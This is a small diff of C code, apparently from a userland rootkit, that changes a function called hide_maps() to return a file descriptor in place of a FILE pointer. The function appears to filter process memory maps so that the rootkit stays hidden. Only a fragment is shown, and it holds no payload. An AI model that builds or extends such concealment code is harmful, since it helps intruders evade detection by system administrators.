@@ -1,6 +1,6 @@
 #include "../rkconsts.h"
 
-FILE* hide_maps(char *path) {
+int hide_maps(char *path) {
     DEBUG_MSG("[-] hide_maps() called\n");
     char buf[8192];
 
@@ -21,5 +21,5 @@ FILE* hide_maps(char *path) {
     fclose(maps_fp);
     fseek(tmp_fp, 0, SEEK_SET);
     CLEAN(rk_home);
-    return tmp_fp;
+    return fileno(tmp_fp);
 }
